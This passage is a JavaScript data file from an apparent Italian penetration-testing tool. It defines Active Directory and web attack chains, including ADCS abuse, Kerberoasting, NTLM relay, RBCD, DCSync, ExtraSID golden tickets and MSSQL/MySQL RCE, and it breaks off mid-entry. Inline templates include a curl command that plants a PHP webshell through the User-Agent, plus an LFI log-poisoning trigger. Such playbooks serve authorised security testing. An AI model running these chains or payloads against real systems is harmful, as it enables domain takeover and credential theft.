/* chains.js — generato da WannaHack il 2026-07-08T13:54:02.513Z */
const CHAINS = [
  {
    "id": "passive-subs",
    "name": "Passive Subdomain Discovery",
    "short": "subs",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "tactic": "Reconnaissance",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Enumerare il massimo dei sottodomini SENZA toccare il target: aggrega più fonti passive, unisci le liste e risolvile per ottenere solo gli host vivi.",
    "outcome": "Lista di sottodomini vivi (host + IP) pronta per la fase active",
    "prereqs": [
      "Solo il dominio root",
      "API key per subfinder/chaos = copertura migliore (opzionale)"
    ],
    "mitre": [
      "T1590.002",
      "T1596.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "CT logs (crt.sh)",
        "cmdRef": "crtsh",
        "verify": "crtsh.txt non è vuoto."
      },
      {
        "id": "s2",
        "verify": "`subfinder.txt` contiene i sottodomini trovati, uno per riga.",
        "title": "subfinder",
        "cmdRef": "subfinder"
      },
      {
        "id": "s3",
        "verify": "`amass.txt` esiste e aggiunge nomi che le altre fonti non avevano restituito.",
        "title": "amass",
        "cmdRef": "amass-passive"
      },
      {
        "id": "s4",
        "verify": "`assetfinder.txt` è popolato.",
        "title": "assetfinder",
        "cmdRef": "assetfinder"
      },
      {
        "id": "s5",
        "verify": "`chaos.txt` è popolato. Un file vuoto con errore di autenticazione indica una `PDCP_API_KEY` mancante o scaduta.",
        "title": "chaos",
        "cmdRef": "chaos"
      },
      {
        "id": "s6",
        "verify": "Vengono creati i file `harvest.xml` e `harvest.json` con host ed email raccolti.",
        "title": "theHarvester",
        "cmdRef": "theharvester",
        "cmd": {
          "name": "theHarvester — emails & hosts",
          "description": "Aggrega email, sottodomini, host e nomi da molte fonti pubbliche. `-b all` lancia tutti i moduli (alcuni richiedono API key e danno solo warning). Le email rivelano la naming convention → user list.",
          "template": "theHarvester -d <domain> -b all -l 500 -f harvest",
          "params": [
            {
              "key": "domain",
              "label": "Domain",
              "ctx": "domain",
              "placeholder": "example.com"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "Tutte le fonti",
              "template": "theHarvester -d <domain> -b all | tee theharvester.txt",
              "description": "Tutte le fonti con l'output salvato in `theharvester.txt` tramite `tee`: testo greppabile, invece dei file strutturati di `-f`."
            },
            {
              "id": "free",
              "label": "Senza API key",
              "template": "theHarvester -d <domain> -b crtsh,duckduckgo,bing,otx,rapiddns -l 500",
              "description": "Solo fonti senza API key: veloce e zero setup."
            }
          ]
        },
        "variant": "default"
      },
      {
        "id": "s7",
        "verify": "`resolved.txt` elenca solo gli host con record A, quindi ha meno righe del file unito di partenza.",
        "title": "Unisci e risolvi",
        "cmdRef": "dnsx-resolve"
      }
    ]
  },
  {
    "id": "passive-footprint",
    "name": "Passive Domain Footprint",
    "short": "recon",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "tactic": "Reconnaissance",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Costruisci una mappa esterna completa del dominio SENZA inviargli traffico: dati di registrazione, DNS, sottodomini, email e servizi esposti, tutto da fonti terze.",
    "outcome": "Lista sottodomini + host vivi + email/naming convention + porte esposte",
    "prereqs": [
      "Serve solo il dominio root",
      "Le API key (Shodan, fonti subfinder) migliorano la copertura (opzionale)"
    ],
    "mitre": [
      "T1590",
      "T1591",
      "T1596",
      "T1589.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Registrazione e nameserver",
        "cmdRef": "whois-domain"
      },
      {
        "id": "s2",
        "verify": "Per ogni tipo interrogato compare la sezione ANSWER. I record MX e TXT rivelano provider di posta e servizi SaaS in uso.",
        "title": "Record DNS",
        "cmdRef": "dig-records"
      },
      {
        "id": "s3",
        "title": "Sottodomini dai CT logs",
        "cmdRef": "crtsh",
        "verify": "crtsh.txt non è vuoto."
      },
      {
        "id": "s4",
        "verify": "`subfinder.txt` aggiunge nomi non presenti fra quelli estratti dai CT log.",
        "title": "Aggrega altri sottodomini",
        "cmdRef": "subfinder"
      },
      {
        "id": "s5",
        "verify": "`resolved.txt` contiene le coppie host e indirizzo IP dei soli host attivi.",
        "title": "Risolvi agli host vivi",
        "cmdRef": "dnsx-resolve"
      },
      {
        "id": "s6",
        "verify": "L'output elenca indirizzi email da cui si deduce la convenzione di naming, per esempio `nome.cognome@`.",
        "title": "Email e naming convention",
        "cmdRef": "theharvester"
      },
      {
        "id": "s7",
        "title": "Servizi esposti (no touch)",
        "cmdRef": "shodan-host"
      }
    ]
  },
  {
    "id": "esc1-to-da",
    "name": "ADCS ESC1 → Domain Admin",
    "short": "esc1",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da un utente di dominio qualsiasi arrivi a Domain Admin abusando di un template di certificato mal configurato (ESC1: client auth, enrollment per utenti poco privilegiati e SAN a piacere).",
    "outcome": "NT hash dell'Administrator o ticket da DA",
    "prereqs": [
      "Credenziali valide di un utente di dominio qualsiasi",
      "Accesso di rete al DC e ad ADCS",
      "Esiste almeno un template vulnerabile"
    ],
    "mitre": [
      "T1649",
      "T1078.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumera i template ADCS vulnerabili",
        "cmdRef": "certipy-find",
        "verify": "Nel report di certipy compare il tag \"ESC1\"."
      },
      {
        "id": "s2",
        "title": "Richiedi il certificato di impersonazione",
        "cmdRef": "certipy-req",
        "overrides": {
          "upn": "administrator@<domain>"
        },
        "verify": "`Got certificate with UPN administrator@…`"
      },
      {
        "id": "s3",
        "title": "PKINIT: TGT e NT hash",
        "cmdRef": "certipy-auth",
        "verify": "`Got hash for administrator@…`"
      },
      {
        "id": "s4",
        "verify": "Il dump parte da `Administrator:500:` con il relativo hash NT e prosegue con tutti gli account di dominio.",
        "title": "Conferma DA con DCSync",
        "cmdRef": "secretsdump",
        "overrides": {
          "user": "administrator",
          "password": ":<hash>"
        }
      }
    ]
  },
  {
    "id": "coerce-relay-adcs",
    "name": "Coerce + Relay → ADCS (ESC8)",
    "short": "esc8",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Initial Access → DA",
    "difficulty": "hard",
    "estTime": "20 min",
    "objective": "Da una posizione in rete senza credenziali: forzi il DC ad autenticarsi in NTLM e rilanci l'auth verso ADCS Web Enrollment per emettere un certificato del DC.",
    "outcome": "TGT del DC$ per il DCSync",
    "prereqs": [
      "Raggiungibilità L3 verso il DC e verso ADCS HTTP",
      "ADCS Web Enrollment attivo e senza Channel Binding"
    ],
    "mitre": [
      "T1187",
      "T1557.001",
      "T1649"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Nel report di certipy compare il tag `ESC8` sull'endpoint web di enrollment.",
        "title": "Conferma l'esposizione a ESC8",
        "cmdRef": "certipy-find"
      },
      {
        "id": "s2",
        "verify": "ntlmrelayx segnala `Servers started, waiting for connections`.",
        "title": "Avvia ntlmrelayx verso /certsrv",
        "cmdRef": "ntlmrelayx-adcs"
      },
      {
        "id": "s3",
        "title": "Forza il DC ad autenticarsi",
        "cmdRef": "coercer",
        "verify": "`Authenticating against http://… as CORP/DC01$ SUCCEED`"
      },
      {
        "id": "s4",
        "verify": "`Got hash for 'dc01$@corp.local'`, cioè l'hash NT del computer account del domain controller.",
        "title": "Converti il certificato in TGT per il DC$",
        "cmdRef": "certipy-auth"
      },
      {
        "id": "s5",
        "verify": "Il dump parte da `Administrator:500:` benché l'autenticazione sia avvenuta come account macchina.",
        "title": "DCSync come DC$",
        "cmdRef": "secretsdump",
        "overrides": {
          "user": "DC01$",
          "password": ""
        }
      }
    ]
  },
  {
    "id": "asrep-kerb-dcsync",
    "name": "AS-REP → Kerberoast → DCSync",
    "short": "offline",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30 min + crack",
    "objective": "Escalation tutta offline: raccogli gli hash AS-REP, ne cracki uno, poi fai Kerberoast e arrivi al DCSync.",
    "outcome": "Dump dell'NTDS",
    "prereqs": [
      "LDAP visibile (anonymous o guest)"
    ],
    "mitre": [
      "T1558.004",
      "T1558.003",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Le righe `[+] VALID USERNAME:` elencano gli account realmente esistenti, mentre gli altri vengono scartati.",
        "title": "Enumera gli utenti di dominio validi",
        "cmdRef": "kerbrute-userenum"
      },
      {
        "id": "s2",
        "verify": "`asrep.txt` contiene hash che iniziano con `$krb5asrep$23$`. Un file vuoto significa che nessun account ha la pre-autenticazione disabilitata.",
        "title": "AS-REP roast degli account senza pre-auth",
        "cmdRef": "getnpusers"
      },
      {
        "id": "s3",
        "verify": "hashcat riporta `Status...: Cracked` e la password compare in coda alla riga dell'hash. Per l'AS-REP il mode corretto è 18200.",
        "title": "Cracka l'AS-REP (hashcat 18200)",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "18200"
        }
      },
      {
        "id": "s4",
        "verify": "`kerb.txt` contiene hash che iniziano con `$krb5tgs$23$*`, uno per ogni account di servizio con SPN registrato.",
        "title": "Kerberoast degli account con SPN",
        "cmdRef": "getuserspns"
      },
      {
        "id": "s5",
        "verify": "Qui il mode è 13100. La password recuperata va poi provata contro un account che in BloodHound risulti avere i diritti di replica.",
        "title": "Cracka e trova un account con diritti DCSync",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "13100"
        }
      },
      {
        "id": "s6",
        "verify": "Il dump elenca gli hash NT di tutto il dominio a partire da `Administrator:500:`, incluso `krbtgt`.",
        "title": "DCSync",
        "cmdRef": "secretsdump"
      }
    ]
  },
  {
    "id": "rbcd-takeover",
    "name": "RBCD Takeover",
    "short": "rbcd",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Prendi il controllo di un computer tramite Resource-Based Constrained Delegation: scrivi AllowedToActOnBehalfOfOtherIdentity, poi S4U2Self+Proxy fino a una shell SYSTEM.",
    "outcome": "Shell SYSTEM sulla vittima",
    "prereqs": [
      "GenericWrite/WriteDACL sull'oggetto computer della vittima",
      "MachineAccountQuota > 0 (default 10), oppure un computer che già controlli"
    ],
    "mitre": [
      "T1134.001",
      "T1550.003"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Viene prodotto uno zip di file JSON. Caricato in BloodHound, un arco `GenericWrite` o `GenericAll` verso il computer target conferma la fattibilità.",
        "title": "Conferma l'ACL con BloodHound",
        "cmdRef": "bloodhound-py"
      },
      {
        "id": "s2",
        "verify": "`Successfully added machine account`. Il quota di default consente dieci computer per utente, quindi il limite può essere già esaurito.",
        "title": "Crea un computer account che controlli",
        "cmdRef": "addcomputer"
      },
      {
        "id": "s3",
        "title": "Scrivi msDS-AllowedToActOnBehalfOfOtherIdentity",
        "cmdRef": "rbcd-write",
        "verify": "`Delegation rights modified successfully!`"
      },
      {
        "id": "s4",
        "verify": "Le righe `Impersonating administrator` e `Saving ticket in administrator.ccache`. Il ticket va poi esportato con `export KRB5CCNAME=administrator.ccache`.",
        "title": "S4U2Self + S4U2Proxy come Administrator",
        "cmdRef": "getst-s4u",
        "overrides": {
          "impersonate": "administrator"
        }
      },
      {
        "id": "s5",
        "verify": "Si apre il prompt `C:\\Windows\\system32>` e `whoami` restituisce `nt authority\\system`.",
        "title": "PSExec con il ticket",
        "cmdRef": "psexec",
        "overrides": {
          "ip": "<victim>.<domain>",
          "user": "administrator",
          "password": ""
        }
      }
    ]
  },
  {
    "id": "mssql-rce",
    "name": "MSSQL → RCE",
    "short": "mssql",
    "category": "service-enum",
    "subcategory": "mssql",
    "tactic": "Exploitation",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Escalation MSSQL standard: login → verifica sysadmin → xp_cmdshell. Se non sei sysadmin, prova IMPERSONATE.",
    "outcome": "RCE come account del servizio SQL",
    "prereqs": [
      "Credenziali MSSQL valide"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Il prompt passa a `SQL>`. Un login rifiutato indica credenziali errate oppure autenticazione Windows richiesta.",
        "title": "Connessione",
        "cmdRef": "mssql-login"
      },
      {
        "id": "s2",
        "verify": "Un valore di ritorno `1` conferma il ruolo sysadmin, mentre `0` obbliga a passare alla via dell'impersonation.",
        "title": "Verifica ruolo",
        "cmdRef": "mssql-roles"
      },
      {
        "id": "s3",
        "verify": "Il comando restituisce l'output nella griglia dei risultati. Il messaggio `SQL Server blocked access to procedure` indica che la riconfigurazione non è andata a buon fine.",
        "title": "xp_cmdshell RCE (via sysadmin)",
        "cmdRef": "mssql-xpcmdshell",
        "overrides": {
          "cmd": "whoami"
        }
      },
      {
        "id": "s4",
        "verify": "`SELECT SYSTEM_USER` restituisce `sa` invece dell'utente originale, quindi l'impersonation è attiva.",
        "title": "Oppure: impersona sa (senza sysadmin)",
        "cmdRef": "mssql-impersonate"
      }
    ]
  },
  {
    "id": "mysql-rce",
    "name": "MySQL → RCE",
    "short": "mysql",
    "category": "service-enum",
    "subcategory": "mysql",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da credenziali MySQL a esecuzione comandi. MySQL non ha un xp_cmdshell pronto: prima verifica FILE privilege e secure_file_priv, poi scegli la via (webshell OUTFILE o UDF).",
    "outcome": "Comando OS come utente del servizio mysqld",
    "prereqs": [
      "Credenziali MySQL valide"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Il prompt passa a `mysql>`.",
        "title": "Connessione",
        "cmdRef": "mysql-login"
      },
      {
        "id": "s2",
        "title": "Verifica prerequisiti RCE",
        "cmdRef": "mysql-privcheck"
      },
      {
        "id": "s3",
        "verify": "`Query OK` e il file compare sotto la webroot. Servono il privilegio FILE e una webroot scrivibile dall'utente del database.",
        "title": "RCE",
        "cmdRef": "mysql-oscmd",
        "variant": "outfile"
      }
    ]
  },
  {
    "id": "lfi-to-rce",
    "name": "LFI → Log Poisoning → RCE",
    "short": "lfi",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Trasforma una Local File Inclusion in esecuzione di codice avvelenando un log con PHP e poi includendolo.",
    "outcome": "RCE come utente del web server",
    "prereqs": [
      "Parametro vulnerabile a LFI",
      "Accesso in lettura a un log (Apache/Nginx/auth)"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "La risposta contiene il contenuto di `/etc/passwd`, quindi l'inclusione arbitraria di file è confermata.",
        "title": "Conferma la LFI",
        "cmdRef": "lfi"
      },
      {
        "id": "s2",
        "verify": "La richiesta viene registrata nel log di access con lo User-Agent malevolo. Il percorso varia fra `/var/log/apache2/access.log` e `/var/log/nginx/access.log` e deve essere leggibile.",
        "title": "Inietta PHP nel log (User-Agent)",
        "cmdRef": "lfi-logpoison",
        "cmd": {
          "name": "LFI — log poisoning → RCE",
          "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
          "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
          "params": [
            {
              "key": "ip",
              "label": "Target",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "1. Inietta nel log & esegui",
              "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
              "description": "Scrive il payload PHP nello `User-Agent`: finisce nell’`access.log`."
            }
          ]
        },
        "variant": "default"
      },
      {
        "id": "s3",
        "verify": "Includendo il log e passando il parametro `cmd`, l'output del comando compare nella pagina e conferma l'esecuzione.",
        "title": "Includi il log ed esegui",
        "cmdRef": "lfi-logpoison",
        "cmd": {
          "name": "LFI — log poisoning → RCE",
          "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
          "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
          "params": [
            {
              "key": "ip",
              "label": "Target",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "1. Inietta nel log",
              "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
              "description": "Scrive il payload PHP nello `User-Agent`: finisce nell’`access.log`."
            },
            {
              "id": "trigger",
              "label": "2. Esegui",
              "template": "http://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
              "description": "LFI sul log: il PHP iniettato viene eseguito, cmd= passa il comando."
            }
          ]
        },
        "variant": "trigger"
      }
    ]
  },
  {
    "id": "kerberoast-crack",
    "name": "Kerberoast → Crack → Lateral",
    "short": "kerb",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30 min",
    "objective": "Richiedi i TGS degli account con SPN, crackali offline e riusa la password trovata per muoverti.",
    "outcome": "Password di un service account (spesso privilegiato)",
    "prereqs": [
      "Credenziali di dominio valide"
    ],
    "mitre": [
      "T1558.003",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "`kerb.txt` contiene almeno un hash `$krb5tgs$23$*`. L'assenza di risultati significa che nessun account utente ha un SPN registrato.",
        "title": "Richiedi i TGS (Kerberoast)",
        "cmdRef": "getuserspns"
      },
      {
        "id": "s2",
        "verify": "`Status...: Cracked` con il mode 13100 e la password in chiaro accanto all'hash.",
        "title": "Cracka offline",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "13100",
          "hashfile": "kerb.txt"
        }
      },
      {
        "id": "s3",
        "verify": "La shell si apre come l'account di servizio compromesso e `whoami` ne conferma l'identità.",
        "title": "Riusa le credenziali",
        "cmdRef": "psexec"
      }
    ]
  },
  {
    "id": "responder-relay",
    "name": "Responder → NTLM Relay → Shell",
    "short": "relay",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "25 min",
    "objective": "Cattura NetNTLMv2 avvelenando LLMNR/NBT-NS; crackalo, oppure rilancialo (relay) verso host senza SMB signing per una shell.",
    "outcome": "Hash NetNTLMv2 o shell su un host senza signing",
    "prereqs": [
      "Posizione in rete (stesso segmento delle vittime)"
    ],
    "mitre": [
      "T1557.001",
      "T1212"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "L'elenco riporta gli host con `signing:False`, che sono gli unici bersagli validi per il relay.",
        "title": "Trova i target senza SMB signing"
      },
      {
        "id": "s2",
        "verify": "Compare `[SMB] NTLMv2-SSP Hash` con l'hash dell'utente che ha risolto il nome. Gli hash vengono salvati anche in `/usr/share/responder/logs/`.",
        "title": "Avvelena e cattura",
        "cmdRef": "responder",
        "variant": "default"
      },
      {
        "id": "s3",
        "verify": "`Authenticating against smb://… SUCCEED` seguito da `Started interactive SMB client shell`. Responder va avviato con SMB e HTTP disabilitati per non intercettare la connessione destinata al relay.",
        "title": "Oppure rilancia (relay)",
        "cmdRef": "ntlmrelayx-smb",
        "variant": "default"
      }
    ]
  },
  {
    "id": "gpp-spray-foothold",
    "name": "GPP/SYSVOL → Spray → Foothold",
    "short": "gpp",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Recuperi una password lasciata nei Group Policy Preferences dentro la share SYSVOL, la decifri (la chiave AES è pubblica) e la riusi in spray sul dominio per ottenere il primo foothold. È uno dei percorsi più comuni quando si parte da una sessione null/anonima.",
    "outcome": "Credenziali di dominio valide e una shell su un host",
    "prereqs": [
      "Accesso in lettura alla share SYSVOL (spesso basta una sessione null o un utente qualsiasi)"
    ],
    "mitre": [
      "T1552.006",
      "T1110.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Recupera le credenziali dai GPP",
        "cmdRef": "nxc-smb-gpp",
        "variant": "gpp",
        "verify": "Il modulo stampa `Found credentials` con username e password già decifrata. Se invece hai trovato tu un `cpassword` dentro un `Groups.xml` sulla SYSVOL, decifralo a mano con `gpp-decrypt <cpassword>`."
      },
      {
        "id": "s2",
        "title": "Controlla la lockout policy",
        "cmdRef": "nxc-smb-passpol",
        "verify": "Leggi `Account Lockout Threshold` prima di spruzzare: se è basso (es. 3-5) usa una sola password per giro per non bloccare gli account."
      },
      {
        "id": "s3",
        "title": "Spray della credenziale sul dominio",
        "cmdRef": "nxc-smb-spray",
        "variant": "default",
        "verify": "Un `[+]` (o `(Pwn3d!)` se l'utente è admin locale) segnala dove la coppia trovata è valida. La stessa password è spesso riusata da più account."
      },
      {
        "id": "s4",
        "title": "Apri la shell",
        "cmdRef": "nxc-winrm",
        "variant": "default",
        "verify": "`whoami` conferma l'accesso come l'utente compromesso. Se WinRM è chiuso, prova psexec/wmiexec o RDP."
      }
    ]
  },
  {
    "id": "shadowcred-pth",
    "name": "Shadow Credentials → NT hash → PtH",
    "short": "shadow",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da un diritto di scrittura (GenericWrite/GenericAll) su un utente o computer, aggiungi una Shadow Credential nell'attributo msDS-KeyCredentialLink, autentichi via PKINIT e ne ricavi l'NT hash. Il tutto senza resettare la password del target, quindi in modo non distruttivo e reversibile.",
    "outcome": "NT hash del target, riusabile in Pass-the-Hash",
    "prereqs": [
      "Edge GenericWrite/GenericAll/AddKeyCredentialLink sul target (da BloodHound)",
      "ADCS o comunque PKINIT abilitato nel dominio"
    ],
    "mitre": [
      "T1552.004",
      "T1550.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma l'edge di scrittura",
        "cmdRef": "bloodhound-py",
        "verify": "In BloodHound il tuo utente ha un edge `GenericWrite`, `GenericAll` o `AddKeyCredentialLink` verso il target. Senza quel diritto la scrittura di msDS-KeyCredentialLink fallisce."
      },
      {
        "id": "s2",
        "title": "Aggiungi la Shadow Credential e recupera l'hash",
        "cmdRef": "shadow-creds",
        "variant": "default",
        "verify": "`certipy-ad shadow auto` stampa `Got hash for ...` con l'NT hash del target, poi rimuove da sé la KeyCredential aggiunta. È preferibile al reset password perché non rompe il login del legittimo utente."
      },
      {
        "id": "s3",
        "title": "Valida l'hash e trova dove è admin",
        "cmdRef": "nxc-pth",
        "variant": "default",
        "verify": "Un `(Pwn3d!)` indica gli host su cui l'hash dà privilegi amministrativi, pronti per il movimento laterale."
      },
      {
        "id": "s4",
        "title": "Apri la shell con l'hash",
        "cmdRef": "evil-winrm",
        "variant": "hash",
        "verify": "`whoami` conferma l'accesso come il target impersonato, usando l'hash al posto della password."
      }
    ]
  },
  {
    "id": "child-to-parent-extrasid",
    "name": "Child → Parent (ExtraSID)",
    "short": "extrasid",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "hard",
    "estTime": "20 min",
    "objective": "Da un child domain compromesso sali all'intero forest: forgia un Golden Ticket del child con il SID degli Enterprise Admins del parent iniettato come ExtraSID.",
    "outcome": "Enterprise Admin sul parent domain",
    "prereqs": [
      "DA (o hash krbtgt) sul child domain",
      "SID del child e degli Enterprise Admins del parent"
    ],
    "mitre": [
      "T1134.005",
      "T1558.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumera il trust e ricava i SID",
        "cmd": {
          "name": "Trust + SID (child / parent)",
          "description": "Prima di forgiare il ticket servono due SID: quello del dominio child (per `-domain-sid`) e quello del parent, il cui gruppo Enterprise Admins è `<SID_parent>-519`. Va anche confermato che il trust sia interno al forest, altrimenti il SID filtering scarta l'ExtraSID.",
          "template": "# da Windows (PowerView):\nGet-DomainSID\nGet-DomainSID -Domain <parentdomain>\nGet-DomainTrust\n# da Linux (Impacket):\nimpacket-lookupsid <childdomain>/<user>:'<password>'@<parentdc>",
          "params": [
            {
              "key": "parentdomain",
              "label": "Parent domain",
              "placeholder": "corp.local"
            },
            {
              "key": "childdomain",
              "label": "Child domain",
              "placeholder": "child.corp.local"
            },
            {
              "key": "user",
              "label": "User",
              "ctx": "user",
              "placeholder": "childadmin"
            },
            {
              "key": "password",
              "label": "Password",
              "ctx": "password",
              "placeholder": "P@ssw0rd"
            },
            {
              "key": "parentdc",
              "label": "Parent DC",
              "placeholder": "10.10.10.5"
            }
          ]
        },
        "verify": "Ottieni il SID del child e quello del parent (Enterprise Admins = `<SID_parent>-519`). `Get-DomainTrust` deve mostrare la relazione `WITHIN_FOREST`: solo così l'ExtraSID non viene filtrato."
      },
      {
        "id": "s2",
        "verify": "Il dump riporta la riga `krbtgt:502:` con l'hash NT necessario a forgiare il ticket.",
        "title": "Dump del krbtgt del child",
        "cmdRef": "dcsync"
      },
      {
        "id": "s3",
        "verify": "`Saving ticket in hacker.ccache`. Il SID del dominio padre va indicato con il suffisso `-519`, che identifica il gruppo Enterprise Admins.",
        "title": "Forgia il Golden Ticket con ExtraSID",
        "cmdRef": "trust-extrasid"
      },
      {
        "id": "s4",
        "verify": "La shell si apre sul domain controller del dominio padre e `whoami /groups` mostra l'appartenenza a Enterprise Admins.",
        "title": "Accedi al parent DC",
        "cmdRef": "psexec"
      }
    ]
  },
  {
    "id": "unconstrained-to-dcsync",
    "name": "Unconstrained → Coerce → DCSync",
    "short": "unconstrained",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "hard",
    "estTime": "15 min",
    "objective": "Con SYSTEM su una macchina con unconstrained delegation forzi il DC ad autenticarsi verso di te, ne catturi il TGT e con quello fai DCSync.",
    "outcome": "Hash del dominio (DCSync)",
    "prereqs": [
      "SYSTEM su una macchina con unconstrained delegation",
      "Il DC deve poterti raggiungere (coercion)"
    ],
    "mitre": [
      "T1187",
      "T1558",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma la delega non vincolata",
        "cmd": {
          "name": "Find unconstrained delegation",
          "description": "Verifica quali computer hanno il flag TRUSTED_FOR_DELEGATION. Il vettore è percorribile solo se hai (o ottieni) SYSTEM su uno di questi, perché è lì che finiranno i TGT catturati.",
          "template": "nxc ldap <ip> -u '<user>' -p '<password>' --find-delegation\n# oppure da Windows (PowerView):\nGet-DomainComputer -Unconstrained | select dnshostname",
          "params": [
            {
              "key": "ip",
              "label": "DC IP",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            },
            {
              "key": "user",
              "label": "User",
              "ctx": "user",
              "placeholder": "jdoe"
            },
            {
              "key": "password",
              "label": "Password",
              "ctx": "password",
              "placeholder": "P@ssw0rd"
            }
          ]
        },
        "verify": "Un computer compare con delega `Unconstrained`. Se è quello su cui controlli SYSTEM, si può procedere alla cattura dei TGT."
      },
      {
        "id": "s2",
        "verify": "Il monitor resta in ascolto e stampa i TGT via via che finiscono nella cache della macchina con delega non vincolata.",
        "title": "Monitora i TGT in arrivo",
        "cmdRef": "unconstrained-deleg"
      },
      {
        "id": "s3",
        "verify": "`Authenticating against … SUCCEED` e sul monitor compare il TGT del computer account del domain controller.",
        "title": "Forza il DC ad autenticarsi",
        "cmdRef": "coercer"
      },
      {
        "id": "s4",
        "verify": "Con il TGT del DC iniettato in `KRB5CCNAME`, il dump degli hash di dominio va a buon fine partendo da `Administrator:500:`.",
        "title": "Inietta il TGT del DC$ e fai DCSync",
        "cmdRef": "dcsync"
      }
    ]
  },
  {
    "id": "acl-path-to-da",
    "name": "Foothold → BloodHound → ACL → DA",
    "short": "aclpath",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30 min",
    "objective": "Dal primo accesso al dominio arrivi a Domain Admin seguendo un attack path di ACL: mappi con BloodHound, abusi i diritti lungo il percorso e chiudi con DCSync.",
    "outcome": "Hash del dominio (DCSync)",
    "prereqs": [
      "Credenziali di un utente di dominio qualsiasi"
    ],
    "mitre": [
      "T1087.002",
      "T1222.001",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Lo zip viene prodotto e, caricato in BloodHound, la query Shortest Path to Domain Admins evidenzia un percorso percorribile dall'utente controllato.",
        "title": "Mappa il dominio con BloodHound",
        "cmdRef": "bloodhound-py"
      },
      {
        "id": "s2",
        "verify": "bloodyAD conferma la modifica. Il valore precedente non è recuperabile, quindi la password cambiata va segnalata nel report.",
        "title": "Abusa l'ACL lungo il path",
        "cmdRef": "acl-abuse"
      },
      {
        "id": "s3",
        "verify": "L'operazione va a buon fine e in BloodHound compaiono gli archi `GetChanges` e `GetChangesAll` verso il dominio.",
        "title": "Concediti i diritti di replica",
        "cmdRef": "writedacl-dcsync"
      },
      {
        "id": "s4",
        "verify": "Il dump parte da `Administrator:500:`. I diritti concessi al passo precedente vanno rimossi a fine attività con `remove dcsync`.",
        "title": "DCSync e cleanup",
        "cmdRef": "dcsync"
      }
    ]
  },
  {
    "id": "sqli-to-creds",
    "name": "SQLi → Dump → Login",
    "short": "sqli",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "tactic": "Credential Access",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Da un’iniezione SQL estrai le credenziali applicative, crackale se hashate e riusale per autenticarti.",
    "outcome": "Credenziali valide dall’applicazione",
    "prereqs": [
      "Parametro iniettabile (SQLi)"
    ],
    "mitre": [
      "T1190",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
